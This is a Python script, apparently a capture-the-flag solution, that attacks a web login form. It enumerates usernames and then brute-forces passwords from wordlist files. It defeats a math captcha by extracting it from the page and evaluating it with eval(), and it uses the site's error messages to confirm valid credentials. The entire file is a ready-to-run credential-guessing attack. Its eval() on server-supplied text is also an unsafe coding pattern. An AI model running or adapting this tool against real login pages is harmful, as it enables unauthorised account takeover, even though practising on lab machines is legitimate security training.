import requests
from termcolor import colored
import time
import argparse

parser = argparse.ArgumentParser(description='Process a URL.')
                         
parser.add_argument(
        '-u',
        '--url',
        help='Enter the login url',
    )

args = parser.parse_args()

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': args.url
}

try:
     if args.url :
        url = args.url
     else :
        url = input("[warning]: Please enter the login url : ")
        
     print(colored("[INFO] : you are processing : %s" % url, "blue"))
     usernames_file = "usernames.txt"
     passwords_file = "passwords.txt"
     
     def usernames_enumeration():
         with open(usernames_file, "r") as file:
              for username in file:
                  username = username.strip("\n")
                  data = {
                      'username': username,
                      'password': 'password'
                  }
            
                  response = requests.post(url, headers=headers, data=data)
                  captcha_signature = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
                  captcha_content = response.text
                  if captcha_signature in captcha_content:
                     beginning = captcha_content.find(captcha_signature) + len(captcha_signature)
                     ending = captcha_content.find('=', beginning)
                
                     captcha = captcha_content[beginning:ending].strip()
                     captcha_answer = f'{captcha} = {eval(captcha)}'
                     captcha_answer = captcha_answer.split()[-1]
                
                     data['captcha'] = captcha_answer
                  send_answer = requests.post(url, headers=headers, data=data)
                     
                  if f"does not exist" in str(send_answer.content):
                     print(colored("[-] Testing username: %s" % username, "red"))
                  else:
                    print("------------------------------------------------------------")
                    print(colored("[+] Valid username found: %s " % username, "green"))
                    time.sleep(2)
                    return username


     
     def brute_force_password(username):
         with open(passwords_file, "r") as file :
              for password in file : 
                  password = password.strip("\n")
                  data = { 
                        'username' : username,
                        'password' : password
                        }
        
                  response = requests.post(url, headers=headers, data=data)
                  captcha_signature = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
                  captcha_content = response.text
                  if captcha_signature in captcha_content:
                     beginning = captcha_content.find(captcha_signature) + len(captcha_signature)
                     ending = captcha_content.find('=', beginning)
                
                     captcha = captcha_content[beginning:ending].strip()
                     captcha_answer = f'{captcha} = {eval(captcha)}'
                     captcha_answer = captcha_answer.split()[-1]
                
                     data['captcha'] = captcha_answer
                     send_answer = requests.post(url, headers=headers, data=data)
                     
                     if f"Invalid password for user" in str(send_answer.content):
                        print(colored("[-] Testing password %s for username: %s" % (password, username), "red"))
                     else : 
                        print("------------------------------------------------------------")
                        print(colored("[+] Valid password for username : %s " % username, "green"))
                        print("username : %s" % username)
                        print("password : %s" % password)
                        print("use these creds to login and get your flag")
                        break
     
     
     username = usernames_enumeration()
     if username is not None :
        brute_force_password(username)
     else : 
        print("No valid username was FOUND! ")
     
     
except requests.exceptions.ReadTimeout:
       print("Try again when the machine is reachable")
